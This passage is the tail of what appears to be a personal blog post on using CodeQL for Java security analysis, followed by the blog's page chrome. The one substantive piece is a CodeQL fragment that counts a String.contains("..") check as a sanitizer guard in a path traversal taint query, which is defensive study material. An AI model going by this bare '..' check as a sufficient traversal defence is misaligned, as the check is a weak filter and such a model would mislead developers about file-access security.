        this<span class="token punctuation">.</span><span class="token punctuation">(</span>MethodAccess<span class="token punctuation">)</span><span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"contains"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
        this<span class="token punctuation">.</span><span class="token punctuation">(</span>MethodAccess<span class="token punctuation">)</span><span class="token punctuation">.</span>getAnArgument<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>StringLiteral<span class="token punctuation">)</span><span class="token punctuation">.</span>getValue<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">".."</span>
}

    override predicate checks<span class="token punctuation">(</span>Expr e<span class="token punctuation">,</span> <span class="token keyword">boolean</span> branch<span class="token punctuation">)</span> {
        e <span class="token operator">=</span> this<span class="token punctuation">.</span><span class="token punctuation">(</span>MethodAccess<span class="token punctuation">)</span><span class="token punctuation">.</span>getQualifier<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> branch <span class="token operator">=</span> <span class="token boolean">false</span>
    }
}

override predicate isSanitizerGuard<span class="token punctuation">(</span>DataFlow::BarrierGuard guard<span class="token punctuation">)</span> {
    guard instanceof ContainsDotDotSanitizer
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://s2.loli.net/2022/07/11/T7knl1sigIOXW54.png" alt="image-20220704155648557"></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">m1yuu</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://m1yuu.com/2022/07/11/codeql-for-java/">https://m1yuu.com/2022/07/11/codeql-for-java/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">m1yuu</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/java%E5%AE%89%E5%85%A8/">
                                    <span class="chip bg-color">java安全</span>
                                </a>
                            
                                <a href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
                                    <span class="chip bg-color">学习记录</span>
                                </a>
                            
                                <a href="/tags/java-web/">
                                    <span class="chip bg-color">java web</span>
                                </a>
                            
                                <a href="/tags/codeql/">
                                    <span class="chip bg-color">codeql</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2022/07/11/codeql-for-jndi/">
                    <div class="card-image">
                        
                        <img src="https://s2.loli.net/2022/07/11/HXWcY6PTo8f1GO2.png" class="responsive-img" alt="codeql_for_jndi">
                        
                        <span class="card-title">codeql_for_jndi</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2022-07-11
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
                                    web安全
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/java%E5%AE%89%E5%85%A8/">
                        <span class="chip bg-color">java安全</span>
                    </a>
                    
                    <a href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
                        <span class="chip bg-color">学习记录</span>
                    </a>
                    
                    <a href="/tags/java-web/">
                        <span class="chip bg-color">java web</span>
                    </a>
                    
                    <a href="/tags/codeql/">
                        <span class="chip bg-color">codeql</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/05/19/tomcat-source/">
                    <div class="card-image">
                        
                        <img src="https://tomcat.apache.org/res/images/tomcat.png" class="responsive-img" alt="tomcat源码学习">
                        
                        <span class="card-title">tomcat源码学习</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-19
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
                                    web安全
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/java%E5%AE%89%E5%85%A8/">
                        <span class="chip bg-color">java安全</span>
                    </a>
                    
                    <a href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
                        <span class="chip bg-color">学习记录</span>
                    </a>
                    
                    <a href="/tags/java-web/">
                        <span class="chip bg-color">java web</span>
                    </a>
                    
                    <a href="/tags/tomcat/">
                        <span class="chip bg-color">tomcat</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: M1yuu<br />'
            + '文章作者: m1yuu<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者m1yuu所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2022</span>
            
            <a href="/about" target="_blank">m1yuu</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/L1gh73r" target="_blank">Matery</a>
            <br>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/L1gh73r" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1367114100@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1367114100@qq.com" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1367114100@qq.com" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
     
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
            }
        </script>
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    
    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
